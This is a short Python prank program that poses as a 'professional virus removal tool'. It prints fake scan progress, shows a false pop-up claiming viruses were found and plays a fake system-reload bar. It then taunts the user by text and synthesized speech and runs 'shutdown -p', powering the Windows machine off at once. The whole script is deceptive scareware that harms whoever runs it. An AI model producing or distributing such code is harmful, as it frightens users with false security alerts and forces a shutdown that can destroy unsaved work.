import tkinter.messagebox
import os
import time
import random
import pyttsx3

engine = pyttsx3.init()

print('专业病毒查杀工具 v5.11')
print('正在检查系统版本……')
time.sleep(random.randint(0,10))
print('检测完成')
print('正在检查环境变量……')
time.sleep(random.randint(0,10))
print('检测完成')
c = input('是否进行病毒检测？（[y][n]）:')
if c == 'y':
    print('正在查找系统中的病毒……')
    time.sleep(1)
    os.system('tree C:/')
    tkinter.messagebox.showwarning('','你的电脑已发现{}处病毒！已自动开始清理！'.format(random.randint(1,10)))
    print('正在尝试强制清除病毒……')
    time.sleep(10)
    print('强制清除清除病毒失败')
    print('正在重载系统……')
    a = 0
    b = 0
    for i in range(100):
        print("{}{}{}%已完成".format('█'*a,' '*b,a))
        time.sleep(random.randint(1,10))
        a += random.randint(1,10)
        b = 100 - a
        if a >= 90:
            if random.randint(1,2) == 1:
                a += 100 - a
                print('█'*100, '100%已完成')
            else:
                print('重载失败，但仍可继续')
            break
    print('正在重新清除病毒……')
    time.sleep(2)
    print('你个傻瓜！！！你被骗啦！！！hiahiahiahia')
    engine.say('你个傻瓜你被骗啦hahahaha')
    time.sleep(1)
    engine.runAndWait()
    os.system('shutdown -p')
else:
    print('感谢你的使用')
    time.sleep(3)
